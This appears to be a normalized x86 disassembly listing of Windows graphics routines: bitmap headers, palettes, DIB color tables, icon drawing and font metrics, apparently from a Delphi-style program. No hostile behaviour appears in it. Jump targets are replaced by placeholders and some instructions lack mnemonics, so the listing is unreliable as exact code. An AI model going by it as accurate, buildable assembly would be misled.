call sub_41b224
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a856
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a91a
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cf94
call sub_425848
jmp r-xdata
sub_42a856
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026ec
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_42a91a
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402cbc
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_42a9af
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_426058
mov [ ebp - 0x30 ] eax
sub_42a9cc
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_42a380
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42aa10
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42a0b0
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41b224
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402cbc
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42a380
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_42a4a8
call sub_425848
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_42aa80
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_42a0b0
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402cbc
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_4295dc
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42ab1b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42a380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42ab44
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_429e80
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_42a0b0
mov eax esi
call sub_42a1c0
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_42a0b0
mov eax esi
call sub_42a1c0
mov eax esi
call sub_42a03c
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_4295dc
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_4299e0
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_42a380
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_42a380
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_428f78
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42ac7c
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42a0c0
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4299e0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42acd0
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_42a0c0
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_4299e0
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42ad50
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_42a0b0
mov eax ebx
call sub_42a0c0
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_428f78
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42ade7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42a380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_428e70
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_423714
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_42adec
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403a9c
call sub_403af0
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_428e70
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ae24
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_429f00
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
sub al 0x1
jb r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
jmp r-xdata
sub al 0x7
je r-xdata
mov eax [ rw-data ]
call sub_425830
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x5d ]
xor ecx ecx
mov edx 0x54
call sub_402cbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x5d ]
mov ecx 0x6
[ edi ] [ esi ]
mov [ ebp - 0x9 ] 0x0
xor edx edx
mov [ ebp - 0x49 ] edx
mov [ ebp - 0x45 ] 0x28
mov edx [ ebp - 0x59 ]
mov [ ebp - 0x41 ] edx
mov edx [ ebp - 0x55 ]
mov [ ebp - 0x3d ] edx
mov [ ebp - 0x39 ] 0x1
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
mov [ ebp - 0x37 ] dx
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
sub bl 0x2
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec bl
je r-xdata
xor eax eax
push ebp
push sub_42af71
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x5d ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4299e0
cmp [ ebp - 0x8 ] 0x0
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_425968
mov ebx eax
push ebx
call CreateHalftonePalette
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x1
push ebx
push 0x0
call ReleaseDC
jmp r-xdata
sub bl 0x2
je r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
mov [ ebp - 0x35 ] 0x3
mov [ ebp - 0x1d ] 0xf800
mov [ ebp - 0x19 ] 0x7e0
mov [ ebp - 0x15 ] 0x1f
jmp r-xdata
sub_42af8c
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_42a0c0
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4299e0
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_42afdc
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42a0c0
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4299e0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42b038
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402cbc
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_42a03c
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_4267ac
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41b25c
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41b25c
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402cbc
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_429e14
mov dl [ r-xdata ]
call sub_425644
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_425968
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_428f2c
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41b25c
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41b25c
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41b25c
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41b25c
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41b25c
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41b25c
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_425dd8
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41b25c
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_4260fc
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_42b2f8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_42a0c0
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_428f78
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42b372
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_4295dc
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42b398
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42b3e0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_426ae8
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_428da4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42b434
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_428da8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ef8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42b464
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_42b73c
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_428da4
mov eax [ esi + 0x28 ]
call sub_428da8
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_418f24
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_42b4c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_425644
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_42b51c
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_42b558
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41b018
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41b224
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_4263a8
jmp r-xdata
jmp r-xdata
call sub_425854
sub_42b5d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b65d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42b51c
cmp eax [ rw-data ]
jne r-xdata
call sub_425854
mov eax esi
call sub_42b51c
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4268ec
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402cbc
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41b25c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42b684
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b712
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41aff8
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41b224
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41b224
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42b73c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_425854
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b717
mov eax [ ebp - 0x4 ]
call sub_4032a8
call sub_403a9c
call sub_403af0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b73c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b77c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_428da4
mov eax [ ebx + 0x28 ]
call sub_428da8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b7fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_42b5d0
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41b25c
pop esi
pop ebx
retn
sub_42b84c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42b88d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call sub_4275a0
mov ecx esi
mov edx ebx
call sub_427204
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b894
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_42b89c
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_425ea8
mov [ rw-data ] eax
pop ebx
retn
sub_42b8d4
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_42b918
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_42b8d4
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_42b9e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42ba1c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_42bc14
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42ba60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42ba48
xor eax eax
